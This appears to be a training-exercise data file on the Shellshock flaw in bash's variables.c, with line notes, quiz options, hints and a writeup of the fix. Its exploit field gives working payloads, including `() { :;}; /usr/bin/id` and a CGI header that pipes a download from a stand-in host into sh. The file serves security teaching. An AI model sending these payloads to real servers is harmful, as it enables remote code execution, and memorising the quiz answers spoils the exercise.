files.name: variables.c

notes.7: Loops over every environment variable the process inherited.
notes.9: Makes a private copy of the `NAME=VALUE` string.
notes.10: Finds the `=` that separates the name from the value.
notes.13: Replaces the `=` with a NUL so `name` and `string` (the value) are separate strings.
notes.17: Checks whether the value begins with `() {` — i.e. it looks like a shell function definition.
notes.19: Allocates a buffer big enough for `NAME VALUE`.
notes.23: Feeds the whole string to the command parser/executor to define the function.

options.label: `sprintf` on line 20 can overflow `expr` when `name` is attacker-controlled
options.whyWrong: The buffer on line 19 is sized from the actual lengths, so there's no overflow here. The flaw is what gets executed, not how it's copied.

options.label: `STREQN` compares only 4 bytes, so a 3-byte value causes an out-of-bounds read
options.whyWrong: Not the issue — the value is NUL-terminated and this short-circuits safely. The danger is executing the value's contents.

options.label: `parse_and_execute` runs the whole string and doesn't stop after the `}`, so any commands appended to the value are executed
Reject values containing a semicolon
options.whyWrong: Trailing commands need no semicolon (a newline or other construct works), and legitimate function bodies contain semicolons. Filtering characters does not constrain what the parser executes.

options.label: Only import variables whose names are on an allowlist
options.whyWrong: The injection is in the VALUE, not the name; an allowed name with a malicious value still triggers execution of the trailing payload.

options.label: Copy the value with strncpy to avoid overflow
options.diff:
-            sprintf(expr, "%s %s", name, string);
+            snprintf(expr, 3 + strlen(name) + string_length, "%s %s", name, string);
options.whyWrong: There is no buffer overflow here; the allocation already accounts for the lengths. The flaw is that the whole string is handed to the command parser.

options.label: Parse only a single function definition and refuse trailing commands

training.exploit: Set an environment variable to `() { :;}; /usr/bin/id`. When bash starts and imports it, line 23 parses the empty function `() { :;}` and then keeps going, executing `/usr/bin/id`. Over CGI, a request header like `User-Agent: () { :;}; curl evil|sh` becomes the `HTTP_USER_AGENT` env var, so an unauthenticated HTTP request runs commands on the server.

hints.line: The problem is the single call that *runs* the imported string.
hints.bugClass: Attacker data is parsed and executed as program code.
hints.why: Does parsing stop at the end of the function body?
hints.fix: Tell the parser to accept only a function definition and nothing after it.

writeup.summary: Bash imports environment variables whose value begins with `() {` as function definitions by concatenating name and value and feeding the whole thing to `parse_and_execute`. The parser does not stop at the end of the function body, so a value like `() { :;}; /usr/bin/id` defines an empty function and then executes `id`. Because web servers (CGI), DHCP clients and SSH forced commands all place attacker-controlled data into environment variables, this became trivial remote code execution. The fix adds `SEVAL_FUNCDEF | SEVAL_ONECMD`: parse exactly one command and require it to be a function definition, so any trailing payload is rejected rather than run. This is Shellshock.
